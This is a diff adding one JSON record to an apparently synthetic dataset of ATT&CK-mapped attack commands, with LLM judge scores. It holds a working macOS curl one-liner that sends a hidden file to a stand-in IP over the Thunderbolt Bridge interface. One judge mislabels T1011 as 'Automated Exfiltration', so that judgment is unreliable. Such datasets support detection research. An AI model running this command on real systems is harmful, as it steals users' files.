@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "curl --interface \"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\" -X POST --data-binary @/Users/$USER/.local/share/.dmp http://203.0.113.60:59671/upload",
+  "explanation": "Uses the Thunderbolt Bridge interface for HTTP POST exfiltration by explicitly binding curl to that alternate medium (T1011).",
+  "rationale_steps": [
+    "Fetch Thunderbolt Bridge IP with networksetup",
+    "Bind curl to the Thunderbolt interface",
+    "POST binary data to a high, uncommon port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-f3051136",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed command with balanced quoting, valid curl flags, and a correct command substitution pipeline.",
+        "semantic_score": 4,
+        "semantic_justification": "Plausibly exfiltrates a file via HTTP while binding to the Thunderbolt Bridge interface, but lacks automation features (e.g., scheduling/retries) and assumes that interface has a valid IP.",
+        "combined_score": 4.5,
+        "confidence": 0.79,
+        "timestamp": "2025-10-01T03:52:17.118895Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command substitution, valid curl flags, and correct use of awk for parsing the network interface information.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 (Automated Exfiltration) by using curl to exfiltrate data from a hidden file (.dmp) over HTTP POST to a remote server through a specific network interface (Thunderbolt Bridge) that might evade monitoring on primary interfaces.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:52:20.336955Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, valid flags, correct command substitution, and proper piping for all its components.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of automated exfiltration via HTTP POST using a specific interface, employing appropriate tools and arguments in an operationally plausible manner consistent with T1011.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T05:52:49.998834Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
